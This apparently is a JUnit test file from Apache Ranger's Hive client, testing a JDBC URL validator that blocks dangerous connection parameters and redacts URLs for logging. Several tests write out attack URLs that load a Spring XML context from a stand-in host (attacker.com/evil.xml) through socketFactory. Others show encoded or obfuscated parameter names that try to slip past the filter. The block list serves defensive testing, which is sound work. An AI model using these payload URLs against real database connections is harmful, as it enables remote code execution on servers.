/*
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */

package org.apache.ranger.services.hive.client;

import org.apache.ranger.plugin.client.HadoopException;
import org.junit.jupiter.api.Disabled;
import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.junit.jupiter.api.Assertions.fail;

@Disabled("Blocked by pre-existing hive-agent/pom.xml conflict: log4j-over-slf4j "
        + "(test-scope) clashes with slf4j-reload4j, causing NoClassDefFoundError "
        + "on any test that triggers SLF4J logger init in this module. "
        + "Not introduced by this PR — this issue will be  tracked separately. "
        + "Verified manually against a local pom.xml with the conflicting dependency removed.")
public class JdbcUrlValidatorTest {

    @Test
    public void simpleUrlWithoutParameters() {
        JdbcUrlValidator.validate("jdbc:hive2://localhost:10000/default");
    }

    @Test
    public void urlWithSafeParameters() {
        JdbcUrlValidator.validate("jdbc:hive2://host:10000/db?user=test&password=secret&ssl=true");
    }

    @Test
    public void urlWithKerberosParameters() {
        JdbcUrlValidator.validate("jdbc:hive2://host:10000/default?principal=hive/host@REALM;auth=kerberos");
    }

    @Test
    public void postgresqlUrlWithSafeParameters() {
        JdbcUrlValidator.validate("jdbc:postgresql://localhost:5432/db?user=test&ssl=true");
    }

    @Test
    public void urlWithWhitespace() {
        JdbcUrlValidator.validate("  jdbc:hive2://host:10000/db  ");
    }

    @Test
    public void rejectsExactBlockedParameters() {
        String[] blockedParams = {
                "socketfactory", "socketfactoryarg", "sslfactory", "sslfactoryarg",
                "sslhostnameverifier", "authenticationpluginclassname", "loggerclassname",
                "kerberosservername", "gssdelegatecred", "sslpasswordcallback"
        };
        for (String blockedParam : blockedParams) {
            String url = "jdbc:hive2://host:10000/db?" + blockedParam + "=malicious";
            try {
                JdbcUrlValidator.validate(url);
                fail("Expected HadoopException for blocked parameter: " + blockedParam);
            } catch (HadoopException exception) {
                assertTrue(exception.getMessage().contains("prohibited parameter"));
                assertTrue(exception.getMessage().contains(blockedParam));
            }
        }
    }

    @Test
    public void rejectsOriginalCvePayload() {
        String url = "jdbc:postgresql://127.0.0.1:5432/x" +
                "?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext" +
                "&socketFactoryArg=http://attacker.com/evil.xml";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for original CVE payload");
        } catch (HadoopException exception) {
            assertTrue(exception.getMessage().contains("prohibited parameter"));
        }
    }

    @Test
    public void rejectsDangerousPatterns() {
        String[] patterns = {"socketfactory", "sslfactory", "autodeserialize"};
        for (String pattern : patterns) {
            String url = "jdbc:hive2://host:10000/db?custom" + pattern + "=malicious";
            try {
                JdbcUrlValidator.validate(url);
                fail("Expected HadoopException for dangerous pattern: " + pattern);
            } catch (HadoopException exception) {
                assertTrue(exception.getMessage().contains("prohibited parameter"));
            }
        }
    }

    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void rejectsMysqlAutoDeserialize() {
        String url = "jdbc:mysql://host:3306/db?customautodeserialize=true";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for MySQL autoDeserialize");
        } catch (HadoopException expected) {
            // expected
        }
    }

    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void rejectsFactoryParameters() {
        String[] factoryParams = {
                "customsocketfactory", "mysslconnectionfactory", "authfactory",
                "driverfactory", "datasourcefactory"
        };
        for (String factoryParam : factoryParams) {
            String url = "jdbc:postgresql://host:5432/db?" + factoryParam + "=com.evil.Factory";
            try {
                JdbcUrlValidator.validate(url);
                fail("Expected HadoopException for factory parameter: " + factoryParam);
            } catch (HadoopException exception) {
                assertTrue(exception.getMessage().contains("prohibited parameter"));
            }
        }
    }

    @Test
    public void allowsNonDangerousFactory() {
        JdbcUrlValidator.validate("jdbc:hive2://host:10000/db?factory=simple&timeout=30");
    }

    @Test
    public void rejectsUrlEncodedSocketFactory() {
        String url = "jdbc:hive2://host:10000/db?socket%46actory=malicious";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for URL-encoded socketFactory");
        } catch (HadoopException exception) {
            assertTrue(exception.getMessage().contains("prohibited parameter"));
        }
    }

    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void rejectsEncodedBypassAttempts() {
        String[] encodedParams = {
                "socket%46actory",      // %46 = 'F'
                "socket%66actory",      // %66 = 'f'
                "%73ocketfactory",      // %73 = 's'
                "ssl%46actory",         // SSL factory with encoded F
                "%73sl%46actory"        // Multiple encoded characters
        };
        for (String encodedParam : encodedParams) {
            String url = "jdbc:postgresql://host:5432/db?" + encodedParam + "=malicious";
            try {
                JdbcUrlValidator.validate(url);
                fail("Expected HadoopException for encoded parameter: " + encodedParam);
            } catch (HadoopException expected) {
                // expected
            }
        }
    }

    // Handles malformed URL encoding gracefully
    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void handlesMalformedEncoding() {
        String url = "jdbc:hive2://host:10000/db?socket%ZZfactory=test";
        try {
            JdbcUrlValidator.validate(url);
        } catch (HadoopException e) {
            assertTrue(e.getMessage().contains("prohibited parameter"));
        }
    }

    // Rejects parameters regardless of case
    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void rejectsParametersRegardlessOfCase() {
        String[] paramNames = {
                "SOCKETFACTORY", "SocketFactory", "socketFactory",
                "SSLFACTORY", "SslFactory", "sslFactory"
        };
        for (String paramName : paramNames) {
            String url = "jdbc:hive2://host:10000/db?" + paramName + "=malicious";
            try {
                JdbcUrlValidator.validate(url);
                fail("Expected HadoopException for parameter: " + paramName);
            } catch (HadoopException expected) {
                // expected
            }
        }
    }

    // Handles mixed case with encoding
    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void handlesMixedCaseWithEncoding() {
        String url = "jdbc:hive2://host:10000/db?Socket%46actory=malicious";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for mixed case with encoding");
        } catch (HadoopException expected) {
            // expected
        }
    }

    // Handles & separator
    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void handlesAmpersandSeparator() {
        String url = "jdbc:hive2://host:10000/db?user=test&socketfactory=evil&ssl=true";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for ampersand separator");
        } catch (HadoopException expected) {
            // expected
        }
    }

    // Handles ; separator
    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void handlesSemicolonSeparator() {
        String url = "jdbc:hive2://host:10000/db?user=test;socketfactory=evil;ssl=true";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for semicolon separator");
        } catch (HadoopException expected) {
            // expected
        }
    }

    // Handles mixed separators
    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void handlesMixedSeparators() {
        String url = "jdbc:hive2://host:10000/db?user=test;ssl=true&socketfactory=evil";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for mixed separators");
        } catch (HadoopException expected) {
            // expected
        }
    }

    // Handles parameters without values
    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void handlesParametersWithoutValues() {
        String url = "jdbc:hive2://host:10000/db?ssl&socketfactory&timeout=30";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for parameters without values");
        } catch (HadoopException expected) {
            // expected
        }
    }

    // Rejects parameters with separator character obfuscation
    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void rejectsObfuscatedParameters() {
        String[] obfuscatedParams = {
                "socket.factory", "socket-factory", "socket_factory",
                "ssl.factory", "ssl-factory", "ssl_factory"
        };
        for (String obfuscatedParam : obfuscatedParams) {
            String url = "jdbc:hive2://host:10000/db?" + obfuscatedParam + "=malicious";
            try {
                JdbcUrlValidator.validate(url);
                fail("Expected HadoopException for obfuscated parameter: " + obfuscatedParam);
            } catch (HadoopException expected) {
                // expected
            }
        }
    }

    // Handles multiple obfuscation techniques
    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void handlesMultipleObfuscation() {
        String url = "jdbc:hive2://host:10000/db?Socket-Factory_ARG=malicious";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for multiple obfuscation techniques");
        } catch (HadoopException expected) {
            // expected
        }
    }

    // Rejects null URL
    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void rejectsNullUrl() {
        try {
            JdbcUrlValidator.validate(null);
            fail("Expected HadoopException for null URL");
        } catch (HadoopException exception) {
            assertTrue(exception.getMessage().contains("must not be null or empty"));
        }
    }

    // Rejects empty URL
    @Test
    public void rejectsEmptyUrl() {
        try {
            JdbcUrlValidator.validate("");
            fail("Expected HadoopException for empty URL");
        } catch (HadoopException exception) {
            assertTrue(exception.getMessage().contains("must not be null or empty"));
        }
    }

    // Rejects whitespace-only URL
    @Test
    public void rejectsWhitespaceOnlyUrl() {
        try {
            JdbcUrlValidator.validate("   ");
            fail("Expected HadoopException for whitespace-only URL");
        } catch (HadoopException exception) {
            assertTrue(exception.getMessage().contains("must not be null or empty"));
        }
    }

    // Handles URL without query parameters
    @Test
    public void handlesUrlWithoutQueryParameters() {
        JdbcUrlValidator.validate("jdbc:hive2://localhost:10000/default");
    }

    // Handles URL with empty query string
    @Test
    public void handlesUrlWithEmptyQueryString() {
        JdbcUrlValidator.validate("jdbc:hive2://localhost:10000/default?");
    }

    // Handles URL with only separators in query
    @Test
    public void handlesUrlWithOnlySeparators() {
        JdbcUrlValidator.validate("jdbc:hive2://localhost:10000/default?&;&;");
    }

    @Test
    public void sanitizesUrlForLogging() {
        String url = "jdbc:hive2://host:10000/db?password=secret&user=test";
        String sanitized = JdbcUrlValidator.sanitizeForLog(url);
        assertFalse(sanitized.contains("secret"));
        assertTrue(sanitized.contains("<params_redacted>"));
        assertTrue(sanitized.contains("jdbc:hive2://host:10000/db"));
    }

    // Handles null URL in sanitization
    @Test
    public void handlesNullUrlInSanitization() {
        String result = JdbcUrlValidator.sanitizeForLog(null);
        assertEquals("<null>", result);
    }

    // Handles URL without parameters in sanitization
    @Test
    public void handlesUrlWithoutParamsInSanitization() {
        String url = "jdbc:hive2://host:10000/db";
        String result = JdbcUrlValidator.sanitizeForLog(url);
        assertEquals(url, result);
    }

    @Test
    public void testSanitizeForLogWithSemicolonParams() {
        String url = "jdbc:hive2://server:10000/db;user=admin;password=secret";
        String result = JdbcUrlValidator.sanitizeForLog(url);
        assertEquals("jdbc:hive2://server:10000/db?<params_redacted>", result);
    }

    @Test
    public void testSanitizeForLogWithQuestionMarkParams() {
        String url = "jdbc:hive2://server:10000/db?user=admin&password=secret";
        String result = JdbcUrlValidator.sanitizeForLog(url);
        assertEquals("jdbc:hive2://server:10000/db?<params_redacted>", result);
    }

    @Test
    public void testSanitizeForLogWithMixedSeparators() {
        String url = "jdbc:hive2://server:10000/db;ssl=true?socketFactory=evil";
        String result = JdbcUrlValidator.sanitizeForLog(url);
        assertEquals("jdbc:hive2://server:10000/db?<params_redacted>", result);
    }

    @Test
    public void blocksSemicolonBeforeQuestion() {
        String url = "jdbc:hive2://host:10000/db;socketFactory=evil?user=test";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for semicolon-before-question delimiters");
        } catch (HadoopException ex) {
            assertTrue(ex.getMessage().contains("socketFactory"));
        }
    }

    @Test
    public void blocksQuestionBeforeSemicolon() {
        String url = "jdbc:hive2://host:10000/db?socketFactory=evil;user=test";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for question-before-semicolon delimiters");
        } catch (HadoopException ex) {
            assertTrue(ex.getMessage().contains("socketFactory"));
        }
    }

    // Handles semicolon-only Hive URLs
    @Test
    public void handlesSemicolonOnly() {
        String url = "jdbc:hive2://host:10000/db;socketFactory=evil";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for semicolon-only URL");
        } catch (HadoopException ex) {
            assertTrue(ex.getMessage().contains("socketFactory"));
        }
    }

    // Handles question-only URLs
    @Test
    public void handlesQuestionOnly() {
        String url = "jdbc:hive2://host:10000/db?socketFactory=evil";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for question-only URL");
        } catch (HadoopException ex) {
            assertTrue(ex.getMessage().contains("socketFactory"));
        }
    }

    @SuppressWarnings("PMD.JUnitUseExpected")
    @Test
    public void complexMaliciousUrl() {
        String url = "jdbc:postgresql://evil.com:5432/db" +
                "?user=admin&password=secret" +
                "&socket%46actory=org.springframework.context.support.ClassPathXmlApplicationContext" +
                "&socketFactoryArg=http://attacker.com/evil.xml" +
                "&SSL-Factory=com.evil.SSLFactory" +
                "&custom_autodeserialize=true";
        try {
            JdbcUrlValidator.validate(url);
            fail("Expected HadoopException for complex malicious URL");
        } catch (HadoopException expected) {
            // expected
        }
    }

    @Test
    public void realWorldHiveUrl() {
        String url = "jdbc:hive2://hive-server:10000/warehouse" +
                "?principal=hive/hive-server@EXAMPLE.COM" +
                ";auth=kerberos" +
                ";ssl=true" +
                ";sslTrustStore=/etc/hive/truststore.jks" +
                ";transportMode=http" +
                ";httpPath=cliservice";
        JdbcUrlValidator.validate(url);
    }

    @Test
    public void postgresqlSafeUrl() {
        String url = "jdbc:postgresql://pg-server:5432/mydb" +
                "?user=admin&password=secret&ssl=true&sslmode=require";
        JdbcUrlValidator.validate(url);
    }
}